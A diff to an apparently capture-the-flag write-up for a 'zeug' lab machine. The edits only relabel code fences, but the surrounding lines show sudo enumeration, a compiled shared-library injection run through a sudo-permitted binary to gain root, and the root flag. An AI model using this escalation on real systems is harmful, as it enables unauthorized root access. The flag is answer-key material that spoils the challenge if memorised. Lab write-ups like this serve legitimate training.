@@ -904,7 +904,7 @@ int main()
 // -1255736440
 ```
 
-```shell title="Exploit it"
+```bash title="Exploit it"
 (remote) cosette@zeug:/home/cosette$ sudo -l
 Matching Defaults entries for cosette on zeug:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
@@ -965,7 +965,7 @@ void init()
 }
 ```
 
-```shell title="Exploit it"
+```bash title="Exploit it"
 (remote) exia@zeug:/home/exia$ gcc -shared -fPIC -o exia.so exia.c
 (remote) exia@zeug:/home/exia$ sudo -u root /usr/bin/zeug
 Hello dynamic linkage world!
@@ -977,7 +977,7 @@ root
 
 ### flag - root
 
-```shell
+```bash
 root@zeug:~# cat root.txt
 HMYVM{root_Ut9RX5o7iZVKXjrOgcGW3fxBq}
 ```
